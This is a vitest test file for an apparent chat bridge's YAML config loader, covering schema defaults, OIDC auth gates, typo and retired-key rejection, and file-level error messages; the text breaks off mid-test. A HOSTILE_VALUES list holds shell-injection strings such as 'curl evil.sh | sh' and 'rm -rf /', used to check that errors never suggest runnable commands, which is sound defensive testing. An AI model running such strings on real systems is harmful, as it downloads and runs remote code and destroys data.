import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import {
  ConfigSchema,
  instanceIdOf,
  loadConfig,
  MAX_BLOCK_MS,
  parseConfig,
} from './config.js';
import { parseMentions } from './mentions.js';
import { HANDLE_CANDIDATES } from './testing/handle-corpus.js';

describe('config loader', () => {
  it('applies defaults from a minimal config', () => {
    const cfg = parseConfig({ identity: { handle: 'ctx-payments' }, topics: ['ctx-payments'] });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 100,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: false, mention_filter: false });
    expect(cfg.permissions.skip_permissions).toBe(false);
    expect(cfg.backend_config).toEqual({});
    expect(cfg.post_topics).toEqual([]);
  });

  // Which post_topics sources are refused is graded against the shared hostile/safe corpus in
  // regex-screen-parity.test.ts.
  it('accepts post_topics and rejects an uncompilable regex', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-.*'] });
    expect(cfg.post_topics).toEqual(['ctx-.*']);
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-('] }),
    ).toThrow(/invalid regex/);
  });

  it('merges partial nested objects with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      catchup: { limit: 50 },
      live_push: { enabled: true },
    });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 50,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: true, mention_filter: false });
  });

  it('passes backend_config through opaquely', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      backend_config: { db_path: '/tmp/x.db', poll_interval_ms: 250 },
    });
    expect(cfg.backend_config).toEqual({ db_path: '/tmp/x.db', poll_interval_ms: 250 });
  });

  it('rejects permissions.skip_permissions: true as unimplemented', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a'],
        permissions: { skip_permissions: true },
      }),
    ).toThrow(/not implemented/);
  });

  it('still accepts an explicit skip_permissions: false', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      permissions: { skip_permissions: false },
    });
    expect(cfg.permissions.skip_permissions).toBe(false);
  });

  it('instanceIdOf defaults to the handle but honors instance_id', () => {
    expect(instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'] }))).toBe('h');
    expect(
      instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'], instance_id: 'sess-2' })),
    ).toBe('sess-2');
  });

  it('rejects a config with no topics', () => {
    expect(() => parseConfig({ identity: { handle: 'h' }, topics: [] })).toThrow();
  });

  it('rejects a config with no handle', () => {
    expect(() => parseConfig({ topics: ['a'] })).toThrow();
  });

  it('defaults auth to the built-in OAuth AS when absent', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'] });
    expect(cfg.auth).toEqual({ mode: 'builtin' });
  });

  it('rejects auth.mode oidc without an oidc block', () => {
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], auth: { mode: 'oidc' } }),
    ).toThrow(/auth\.oidc/);
  });

  it('parses a full oidc auth block with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      auth: {
        mode: 'oidc',
        oidc: {
          issuer: 'https://kc.example.com/realms/parley',
          audience: 'parley-mcp',
          required_role: 'parley-owner',
          allowed_usernames: ['alice'],
        },
      },
    });
    expect(cfg.auth.mode).toBe('oidc');
    expect(cfg.auth.oidc).toEqual({
      issuer: 'https://kc.example.com/realms/parley',
      audience: 'parley-mcp',
      required_role: 'parley-owner',
      allowed_usernames: ['alice'],
      clock_skew_s: 30,
    });
  });

  it('rejects a bad issuer URL, empty gate lists, and out-of-range clock skew', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer: 'not-a-url' } } }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', allowed_subjects: [] } },
      }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', clock_skew_s: 301 } },
      }),
    ).toThrow();
  });

  /**
   * The schema is the earlier, better-located half of the same rule the factory restates. A scope
   * TOKEN is `1*NQCHAR` and the verifier matches it against `scope.split(' ')`, so `min(1)` let a
   * whitespace value load cleanly and then 403 every valid token; grade both directions of the
   * value space, not only the one that reads as a mistake.
   */
  it.each([
    ['', false],
    [' ', false],
    ['\t', false],
    ['mcp ', false],
    ['read write', false],
    ['mcp', true],
    ['parley:read', true],
  ])('auth.oidc.required_scope %j is accepted: %s', (required_scope, accepted) => {
    const build = (): unknown =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a'],
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'https://kc.example.com/realms/x', allowed_subjects: ['s'], required_scope },
        },
      });
    if (accepted) expect(build).not.toThrow();
    else expect(build).toThrow(/required_scope must be a single non-blank scope token/);
  });

  it('rejects an oidc block with no identity gate (fail-closed)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    const issuer = 'https://kc.example.com/realms/x';
    // Gate-less: none of allowed_subjects / allowed_usernames / required_role → rejected.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, audience: 'parley-mcp' } },
      }),
    ).toThrow(/identity gate/);
    // required_scope alone is NOT a sufficient gate.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, required_scope: 'mcp' } },
      }),
    ).toThrow(/identity gate/);
    // Any one of the three gates makes it parse.
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_subjects: ['owner-sub'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_usernames: ['alice'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, required_role: 'parley-owner' } } }),
    ).not.toThrow();
  });

  it('rejects an http issuer but exempts loopback (https requirement)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://kc.example.com/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).toThrow(/https/);
    // Loopback stays usable so the in-process fake IdP (http://127.0.0.1) works in tests/dev.
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://127.0.0.1:8080/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).not.toThrow();
  });
});

// A fully-populated config, so that a field added later is covered by the walkers below the moment
// it appears here.
const FULL = {
  instance_id: 'inst',
  state_path: '/tmp/parley-state.json',
  identity: { handle: 'h' },
  topics: ['ctx'],
  post_topics: ['ctx-.*'],
  catchup: {
    on_start: true,
    limit: 10,
    block_max_ms: 1000,
    block_poll_interval_ms: 100,
  },
  live_push: { enabled: true, mention_filter: false },
  permissions: { skip_permissions: false },
  auth: {
    mode: 'oidc',
    oidc: {
      issuer: 'https://kc.example.com/realms/r',
      audience: 'parley-mcp',
      jwks_uri: 'https://kc.example.com/jwks',
      required_scope: 'mcp',
      allowed_subjects: ['sub-1'],
      allowed_usernames: ['alice'],
      required_role: 'parley-owner',
      clock_skew_s: 30,
    },
  },
  backend_config: { db_path: './x.db' },
};

/** Walk to the object holding `path`'s leaf in a mutable clone. */
function parentOf(root: Record<string, unknown>, path: string[]): Record<string, unknown> {
  let node = root;
  for (const step of path.slice(0, -1)) node = node[step] as Record<string, unknown>;
  return node;
}

/** Every key path a config document carries, objects included. */
function keyPaths(node: unknown, prefix: string[] = []): string[][] {
  if (typeof node !== 'object' || node === null || Array.isArray(node)) return [];
  return Object.entries(node).flatMap(([k, v]) => [[...prefix, k], ...keyPaths(v, [...prefix, k])]);
}

type LeafKind = 'string' | 'number' | 'boolean' | 'enum' | 'string[]' | 'opaque';

interface SchemaLeaf {
  label: string;
  path: string[];
  kind: LeafKind;
  /** The alternatives an `enum` leaf accepts — the only leaf kind whose second legal value is not
   *  derivable from the first. */
  options: readonly string[];
}

interface SchemaWalk {
  paths: string[][];
  leaves: SchemaLeaf[];
}

/** The `_def` fields this walk reads. zod types them per node class, not discriminably. */
interface ZodDefLike {
  typeName: string;
  schema?: z.ZodTypeAny;
  innerType?: z.ZodTypeAny;
  type?: z.ZodTypeAny;
  values?: readonly string[];
}

const defOf = (node: z.ZodTypeAny): ZodDefLike => node._def as unknown as ZodDefLike;
const shapeOf = (node: z.ZodTypeAny): Record<string, z.ZodTypeAny> =>
  (node as z.ZodObject<z.ZodRawShape>).shape;

/**
 * Enumerate the config surface from `ConfigSchema` ITSELF. Every registry below grades the schema
 * through the `FULL` fixture, and nothing proved the fixture complete: a knob added to the schema
 * alone had no row in any walker and no ceiling entry, so it loaded ungraded and the walkers stayed
 * green. Keep an unrecognised node kind a THROW rather than an empty subtree, so that a future zod
 * construct (a union, a lazy, a branded leaf) cannot silently shrink what the fixture is measured
 * against — that is the failure being ratcheted, one level up.
 */
function walkSchema(node: z.ZodTypeAny, prefix: string[] = []): SchemaWalk {
  const def = defOf(node);
  switch (def.typeName) {
    case 'ZodEffects':
      return walkSchema(def.schema!, prefix);
    case 'ZodDefault':
    case 'ZodOptional':
    case 'ZodNullable':
      return walkSchema(def.innerType!, prefix);
    default:
      break;
  }
  const leaf = (kind: LeafKind, options: readonly string[] = []): SchemaWalk => ({
    paths: [],
    leaves: [{ label: prefix.join('.'), path: prefix, kind, options }],
  });
  switch (def.typeName) {
    case 'ZodObject': {
      const out: SchemaWalk = { paths: [], leaves: [] };
      for (const [key, child] of Object.entries(shapeOf(node))) {
        const path = [...prefix, key];
        out.paths.push(path);
        const sub = walkSchema(child, path);
        out.paths.push(...sub.paths);
        out.leaves.push(...sub.leaves);
      }
      return out;
    }
    case 'ZodString':
      return leaf('string');
    case 'ZodNumber':
      return leaf('number');
    case 'ZodBoolean':
      return leaf('boolean');
    case 'ZodEnum':
      return leaf('enum', def.values ?? []);
    case 'ZodRecord':
      return leaf('opaque');
    case 'ZodArray': {
      const element = walkSchema(def.type!, prefix);
      const kind = element.leaves[0]?.kind;
      if (kind !== 'string') throw new Error(`${prefix.join('.')}: array of ${String(kind)}`);
      return leaf('string[]');
    }
    default:
      throw new Error(`${prefix.join('.') || '<root>'}: unhandled schema node ${String(def.typeName)}`);
  }
}

const SCHEMA = walkSchema(ConfigSchema);
/** `backend_config` is opaque to core (DESIGN §11); its interior is deliberately unmodelled. */
const CORE_PATH = (path: readonly string[]): boolean => path[0] !== 'backend_config';
const SCHEMA_LEAVES = SCHEMA.leaves.filter((l) => CORE_PATH(l.path));

describe('the fixture the config walkers run on is the whole schema', () => {
  it('FULL carries exactly the paths ConfigSchema declares', () => {
    expect(SCHEMA.paths.filter(CORE_PATH).map((p) => p.join('.')).sort()).toEqual(
      keyPaths(FULL).filter(CORE_PATH).map((p) => p.join('.')).sort(),
    );
  });

  it('models every leaf the walkers have to perturb (nothing lands as opaque but backend_config)', () => {
    expect(SCHEMA_LEAVES.filter((l) => l.kind === 'opaque')).toEqual([]);
    expect(SCHEMA_LEAVES.length).toBeGreaterThan(15);
  });

  /**
   * The positive control for the walk, on a schema built here rather than on `ConfigSchema` — the
   * artifact it audits cannot also be what proves it sees. One row per wrapper the real schema
   * uses; a wrapper the walk cannot see through would drop its whole subtree and let the
   * completeness case above pass while grading less.
   */
  it('sees a leaf through every wrapper, and reports a path a fixture would lack', () => {
    const probe = z
      .object({
        plain: z.string(),
        defaulted: z.number().default(1),
        optional: z.string().optional(),
        listed: z.array(z.string()).nonempty(),
        flag: z.boolean(),
        picked: z.enum(['p', 'q']),
        nested: z.object({ inner: z.number() }).strict().default({ inner: 0 }),
        transformed: z
          .object({ t: z.string() })
          .strict()
          .transform((v) => v),
      })
      .strict()
      .superRefine(() => {});
    const walk = walkSchema(probe);
    expect(walk.paths.map((p) => p.join('.')).sort()).toEqual([
      'defaulted',
      'flag',
      'listed',
      'nested',
      'nested.inner',
      'optional',
      'picked',
      'plain',
      'transformed',
      'transformed.t',
    ]);
    expect(walk.leaves.map((l) => `${l.label}:${l.kind}`).sort()).toEqual([
      'defaulted:number',
      'flag:boolean',
      'listed:string[]',
      'nested.inner:number',
      'optional:string',
      'picked:enum',
      'plain:string',
      'transformed.t:string',
    ]);
    const fixture = { plain: 'a', defaulted: 1 };
    expect(
      walk.paths.map((p) => p.join('.')).filter((l) => !keyPaths(fixture).some((f) => f.join('.') === l)),
    ).toContain('nested.inner');
  });

  it('refuses to walk a node kind it does not model', () => {
    expect(() => walkSchema(z.object({ mystery: z.union([z.string(), z.number()]) }))).toThrow(
      /mystery: unhandled schema node ZodUnion/,
    );
  });
});

// A key the schema does not know is a LOAD ERROR, not a silent strip: an operator typo must not
// produce a bridge that quietly does nothing.
describe('config rejects unknown keys', () => {
  it('accepts the fully-populated fixture', () => {
    expect(() => parseConfig(structuredClone(FULL))).not.toThrow();
  });

  // `backend_config` is opaque to core (DESIGN §11), so its interior is deliberately open.
  const paths = keyPaths(FULL).filter((p) => p[0] !== 'backend_config');

  it.each(paths.map((p) => [p.join('.'), p]))(
    'rejects a near-miss of %s instead of ignoring it',
    (_label, path) => {
      const mutated = structuredClone(FULL) as Record<string, unknown>;
      const node = parentOf(mutated, path as string[]);
      const leaf = (path as string[]).at(-1)!;
      node[leaf.length > 1 ? leaf.slice(0, -1) : `${leaf}x`] = node[leaf];
      delete node[leaf];
      expect(() => parseConfig(mutated)).toThrow();
    },
  );

  it.each([
    ['live_push.enable', { identity: { handle: 'h' }, topics: ['t'], live_push: { enable: true } }],
    ['catchup.limt', { identity: { handle: 'h' }, topics: ['t'], catchup: { limt: 5 } }],
    ['presense', { identity: { handle: 'h' }, topics: ['t'], presense: { enabled: false } }],
    ['identiy', { identiy: { handle: 'h' }, identity: { handle: 'h' }, topics: ['t'] }],
    [
      'permissions.skip_permission',
      { identity: { handle: 'h' }, topics: ['t'], permissions: { skip_permission: true } },
    ],
  ])('rejects the operator typo %s', (_label, raw) => {
    expect(() => parseConfig(raw)).toThrow();
  });
});

// Every string field in a config NAMES something — a path, a read-state namespace, a topic, an
// issuer — and none of them can name it with the empty string. A field that accepts `''` loads
// cleanly and fails later, far from the config: `state_path: ''` served traffic and then threw
// ENOENT on the first cursor persist, and `instance_id: ''` silently merged two sessions' read
// state. Walk the fixture so a string field added later is graded the moment it appears there.
describe('config rejects an empty string in any field that names something', () => {
  interface StringLeaf {
    label: string;
    path: string[];
    index?: number;
  }

  function stringLeaves(node: unknown, prefix: string[] = []): StringLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      const label = path.join('.');
      if (typeof value === 'string') return [{ label, path }];
      if (Array.isArray(value))
        return value.flatMap((element, index) =>
          typeof element === 'string' ? [{ label: `${label}[${index}]`, path, index }] : [],
        );
      return stringLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11) and may legitimately carry an empty string.
  const leaves = stringLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  it('finds every string field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.mode',
      'auth.oidc.allowed_subjects[0]',
      'auth.oidc.allowed_usernames[0]',
      'auth.oidc.audience',
      'auth.oidc.issuer',
      'auth.oidc.jwks_uri',
      'auth.oidc.required_role',
      'auth.oidc.required_scope',
      'identity.handle',
      'instance_id',
      'post_topics[0]',
      'state_path',
      'topics[0]',
    ]);
  });

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set to ""', (_label, leaf) => {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    const node = parentOf(mutated, leaf.path);
    const key = leaf.path.at(-1)!;
    if (leaf.index === undefined) node[key] = '';
    else (node[key] as string[])[leaf.index] = '';
    expect(() => parseConfig(mutated)).toThrow();
  });
});

// Every numeric field is a count or a duration, and none of them means anything at zero, below zero
// or between integers: `catchup.limit: 0` makes catch-up's `messages.length < limit` break condition
// false forever and page without end, `block_poll_interval_ms: 0` turns the long-poll fallback into a
// tight re-query loop. Walk the fixture so a knob added later is graded the moment it appears
// there.
describe('config rejects a degenerate number in any numeric field', () => {
  interface NumericLeaf {
    label: string;
    path: string[];
    value: number;
  }

  function numericLeaves(node: unknown, prefix: string[] = []): NumericLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      if (typeof value === 'number') return [{ label: path.join('.'), path, value }];
      return numericLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11); its numbers are the plugin's to police.
  const leaves = numericLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  // Zero is legal only where it names "no cap" / "no tolerance" rather than a cadence or a count.
  const ZERO_IS_LEGAL = new Set(['catchup.block_max_ms', 'auth.oidc.clock_skew_s']);

  it('finds every numeric field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.oidc.clock_skew_s',
      'catchup.block_max_ms',
      'catchup.block_poll_interval_ms',
      'catchup.limit',
    ]);
  });

  function withValue(leaf: NumericLeaf, value: number): Record<string, unknown> {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    parentOf(mutated, leaf.path)[leaf.path.at(-1)!] = value;
    return mutated;
  }

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set below zero', (_label, leaf) => {
    expect(() => parseConfig(withValue(leaf, -1))).toThrow();
  });

  // The fixture's own value plus a half, so that every range bound the field carries still holds
  // and `.int()` is the only thing left that can reject the row.
  it.each(leaves.map((l) => [l.label, l] as const))(
    'rejects %s set to a fraction',
    (_label, leaf) => {
      expect(() => parseConfig(withValue(leaf, leaf.value + 0.5))).toThrow();
    },
  );

  it.each(leaves.map((l) => [l.label, l] as const))('grades %s set to zero', (label, leaf) => {
    const parse = (): unknown => parseConfig(withValue(leaf, 0));
    if (ZERO_IS_LEGAL.has(label)) expect(parse).not.toThrow();
    else expect(parse).toThrow();
  });

  // A docstring that promises a relationship — `block_max_ms` is clamped "safely below MCP / client
  // tool timeouts" — is worth only what the schema behind it enforces. So grade the ceiling too:
  // a knob with one refuses the first step past it, and a knob without one says so out loud. A knob
  // added later has no row and fails as a missing entry rather than as silent acceptance.
  const CEILINGS = new Map<string, number | null>([
    ['auth.oidc.clock_skew_s', 300],
    ['catchup.block_max_ms', MAX_BLOCK_MS],
    ['catchup.block_poll_interval_ms', null],
    ['catchup.limit', null],
  ]);

  // Both registries above are keyed by label, so a renamed or removed knob leaves a row that grades
  // nothing while still reading as coverage. Key them off the schema in the other direction too.
  it('carries no registry row for a numeric field the schema no longer has', () => {
    const numeric = SCHEMA_LEAVES.filter((l) => l.kind === 'number').map((l) => l.label);
    expect([...CEILINGS.keys()].filter((label) => !numeric.includes(label))).toEqual([]);
    expect([...ZERO_IS_LEGAL].filter((label) => !numeric.includes(label))).toEqual([]);
    expect(numeric.filter((label) => !CEILINGS.has(label))).toEqual([]);
    expect(leaves.map((l) => l.label).sort()).toEqual(numeric.sort());
  });

  const FAR_ABOVE_ANY_PLAUSIBLE_CAP = 86_400_000;

  it.each(leaves.map((l) => [l.label, l] as const))(
    'grades %s against its documented ceiling',
    (label, leaf) => {
      expect(
        CEILINGS.has(label),
        `${label} has no ceiling row: add a number, or null for "deliberately unbounded"`,
      ).toBe(true);
      const ceiling = CEILINGS.get(label) ?? null;
      if (ceiling === null) {
        expect(() => parseConfig(withValue(leaf, FAR_ABOVE_ANY_PLAUSIBLE_CAP))).not.toThrow();
        return;
      }
      expect(() => parseConfig(withValue(leaf, ceiling))).not.toThrow();
      expect(() => parseConfig(withValue(leaf, ceiling + 1))).toThrow();
    },
  );
});

// `mention_filter` compares a parsed @mention against `identity.handle`, so a handle the mention
// grammar cannot produce silently drops EVERY inbound message. Either grammar may widen later;
// the invariant is that the two agree, so assert the round trip rather than one bad handle.
describe('mention_filter requires a mentionable handle', () => {
  it.each(HANDLE_CANDIDATES.map((h) => [JSON.stringify(h), h] as const))(
    'either rejects %s at load or can actually match it',
    (_label, handle) => {
      const raw = {
        identity: { handle },
        topics: ['t'],
        live_push: { enabled: true, mention_filter: true },
      };
      let loaded = true;
      try {
        parseConfig(raw);
      } catch {
        loaded = false;
      }
      if (!loaded) return;
      expect(parseMentions(`hi @${handle} there`)).toContain(handle);
    },
  );

  it('leaves a non-mentionable handle usable when mention_filter is off', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'parley-bot@localhost' },
        topics: ['t'],
        live_push: { enabled: true, mention_filter: false },
      }),
    ).not.toThrow();
  });
});

// This module refuses `permissions.skip_permissions: true` and every unknown key on one argument:
// a setting nothing reads leaves the operator with a bridge that quietly does nothing.
// `live_push.mention_filter` is that argument one level in: nothing on the reactive path reads it,
// so beneath a disabled `live_push.enabled` it has to be a LOAD ERROR rather than an accepted no-op.
it('refuses live_push.mention_filter beneath a disabled live_push.enabled', () => {
  let issuePaths: unknown[][] = [];
  try {
    parseConfig({
      identity: { handle: 'h' },
      topics: ['ctx'],
      post_topics: ['.*'],
      live_push: { enabled: false, mention_filter: true },
    });
  } catch (e) {
    issuePaths = (e as { issues?: { path: unknown[] }[] }).issues?.map((i) => i.path) ?? [];
  }
  expect(issuePaths).toContainEqual(['live_push', 'mention_filter']);
});

// An error message shaped as a command is a command an operator will paste, and `backend:` is the one
// place a config VALUE was interpolated into one. A config file is not always operator-authored end
// to end — generated, templated, or committed by someone else — so grade the CLASS: no value drawn
// from the input may appear inside backticks unless it is a bare package-name token, and no backticked
// span in any parseConfig error may carry a shell metacharacter or a control byte at all.
describe('no config value reaches a runnable suggestion', () => {
  const HOSTILE_VALUES: readonly (readonly [string, string])[] = [
    ['shell chain', 'sqlite && curl evil.sh | sh'],
    ['command substitution', 'sqlite$(id)'],
    ['backtick substitution', 'sqlite`id`'],
    ['semicolon', 'sqlite; rm -rf /'],
    ['pipe to shell', 'sqlite|sh'],
    ['redirect', 'sqlite > /etc/passwd'],
    ['newline', 'sqlite\ncurl evil.sh | sh'],
    ['carriage return', 'sqlite\rcurl evil.sh'],
    ['ANSI erase-line', 'sqlite\u001b[2Kcurl evil.sh'],
    ['tab and quotes', 'sqlite\t"x"'],
    ['leading dash', '--version'],
    ['path traversal', '../../../../bin/sh'],
    ['scoped package', '@evil/parley-sqlite'],
    ['trailing space', 'sqlite '],
    ['uppercase', 'SQLITE'],
    ['ten kilobytes', 'a'.repeat(10_000)],
  ] as const;

  // Values that ARE a bare package suffix: the suggestion must still be built for these, so that
  // narrowing the gate cannot be satisfied by dropping the operator's guidance altogether.
  const SAFE_VALUES = ['sqlite', 'local-sqlite', 'matrix', 'redis', 'x', 'a-b-c9'] as const;

  const GENERIC_SUGGESTION = /parley-sqlite, parley-matrix, parley-redis/;
  /** Anything that changes what a pasted command does, plus every C0 control byte. */
  const NOT_A_COMMAND = /[;&|$><`"'\\\u0000-\u001f]/;

  function runnableSpans(message: string): string[] {
    return [...message.matchAll(/`([^`]*)`/g)].map((m) => m[1]!);
  }

  function messageFor(raw: unknown): string {
    try {
      parseConfig(raw);
    } catch (e) {
      return (e as Error).message;
    }
    return '';
  }

  it.each(HOSTILE_VALUES)('never suggests running a hostile `backend` value (%s)', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    expect(message).not.toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each(SAFE_VALUES)('still names the binary for a bare backend suffix (%s)', (value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each([
    ['number', 42],
    ['null', null],
    ['boolean', true],
    ['object', { name: 'sqlite' }],
    ['array', ['sqlite']],
  ])('refuses a non-string `backend` (%s) without claiming a binary', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  // The same class, one field at a time, over the strings an operator populates: whichever field a
  // hostile value lands in, whatever message comes back must not read as a command to run.
  const FIELDS = ['instance_id', 'state_path', 'topics', 'post_topics'] as const;
  const FIELD_ROWS = FIELDS.flatMap((field) =>
    HOSTILE_VALUES.map(([label, value]) => {
      const raw: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['a'] };
      if (field === 'topics' || field === 'post_topics') raw[field] = [value];
      else raw[field] = value;
      return [`${field} = ${label}`, raw] as const;
    }),
  );

  it('crosses every populated string field with every hostile value', () => {
    expect(FIELD_ROWS.length).toBe(FIELDS.length * HOSTILE_VALUES.length);
    expect(FIELD_ROWS.length).toBeGreaterThan(45);
  });

  it.each(FIELD_ROWS)('never renders %s as a command', (_label, raw) => {
    for (const span of runnableSpans(messageFor(raw))) expect(span).not.toMatch(NOT_A_COMMAND);
  });
});

// CLASS: a key this loader once shipped and has since retired. `.strict()` reports one as
// "Unrecognized key(s) in object", rendered at `(document)` scope — a typo diagnosis, for a key an
// upgrading operator copied out of a config that used to work. Every retirement therefore owes the
// operator a diagnostic that names the key's own path and says it was removed; grade the set, so
// the next retirement is graded the day it lands rather than the round after.
describe('a retired config key is refused by name, not as a suspected typo', () => {
  const dir = mkdtempSync(join(tmpdir(), 'parley-retired-'));
  const RETIRED = [
    ['backend', 'backend: local-sqlite\n', /`backend` is not a supported field/],
    ['permissions.skip_permissions', 'permissions:\n  skip_permissions: true\n', /not implemented/],
    ['presence', 'presence:\n  enabled: true\n', /presence was removed[\s\S]*parley_list_users/],
  ] as const;

  const BASE = 'identity:\n  handle: ctx\ntopics:\n  - ctx\n';
  const write = (name: string, text: string): string => {
    const path = join(dir, `${name}.yaml`);
    writeFileSync(path, text);
    return path;
  };

  it('the base config loads (positive control: the rows cannot pass by throwing always)', () => {
    expect(loadConfig(write('base', BASE)).topics).toEqual(['ctx']);
  });

  it.each(RETIRED)('%s', (key, yaml, matcher) => {
    let thrown: unknown;
    try {
      loadConfig(write(key.replace(/\./g, '-'), BASE + yaml));
    } catch (e) {
      thrown = e;
    }
    expect(thrown, `${key} was accepted`).toBeInstanceOf(Error);
    const rendered = (thrown as Error).message;
    expect(rendered, 'the diagnostic must name the retired key by its own path').toContain(key);
    expect(rendered, 'rendered at document scope, which reads as a typo in the file').not.toContain(
      '(document)',
    );
    expect(rendered).toMatch(matcher);
  });
});

// `loadConfig` is what every shipped backend CLI calls, so its failure message is the first thing a
// stuck operator reads. Grade the CLASS "every way a config FILE can fail names the file and the
// kind of failure" rather than the empty-document instance: one row per way a whole file goes wrong,
// each asserting the path appears and that no raw zod dump leaked through. The positive control is
// what keeps the rows honest — without it, `loadConfig = () => { throw new Error(path) }` passes
// every row.
describe('loadConfig names the file and the failure kind', () => {
  const dir = mkdtempSync(join(tmpdir(), 'parley-config-'));
  const write = (name: string, text: string): string => {
    const path = join(dir, name);
    writeFileSync(path, text);
    return path;
  };

  const VALID = [
    'identity:',
    '  handle: ctx-payments',
    'topics:',
    '  - ctx-payments',
    '',
  ].join('\n');

  const FILE_FAILURES: readonly (readonly [label: string, path: () => string, expect: RegExp])[] = [
    ['a file that does not exist', () => join(dir, 'absent.yaml'), /cannot read config .*ENOENT/],
    ['a directory in place of a file', () => dir, /cannot read config .*EISDIR/],
    ['an empty file', () => write('empty.yaml', ''), /is empty \(or holds only comments\)/],
    ['a comment-only file', () => write('comments.yaml', '# nothing here\n'), /is empty \(or holds only comments\)/],
    ['a top-level scalar', () => write('scalar.yaml', 'just-a-string\n'), /is a bare string/],
    ['a top-level sequence', () => write('seq.yaml', '- ctx\n- ctx2\n'), /is a YAML sequence/],
    ['a YAML syntax error', () => write('syntax.yaml', 'identity:\n   handle: a: b\n'), /is not valid YAML/],
    ['a missing required field', () => write('nofields.yaml', 'topics:\n  - ctx\n'), /identity: .*required/i],
    ['an unknown top-level key', () => write('unknown.yaml', `${VALID}presense: {}\n`), /presense/],
    ['a field-level rule violation', () => write('badfilter.yaml', `${VALID}live_push:\n  mention_filter: true\n`), /live_push\.mention_filter: .*live_push\.enabled/],
    ['a legacy backend key', () => write('backend.yaml', `${VALID}backend: local-sqlite\n`), /`backend` is not a supported field/],
  ] as const;

  it('a valid file still loads (positive control: the rows cannot pass by throwing always)', () => {
    const cfg = loadConfig(write('good.yaml', VALID));
    expect(cfg.identity.handle).toBe('ctx-payments');
    expect(cfg.topics).toEqual(['ctx-payments']);
  });

  it.each(FILE_FAILURES)('%s', (_label, path, matcher) => {
    const file = path();
    let thrown: unknown;
    try {
      loadConfig(file);
    } catch (e) {
      thrown = e;
    }
    expect(thrown, 'the file was accepted').toBeInstanceOf(Error);
    const message = (thrown as Error).message;
    expect(message, 'the failure must name the file').toContain(file);
    expect(message).toMatch(matcher);
    // A serialized zod error names neither the file nor the shape expected; it is the regression
    // this whole table exists to keep out.
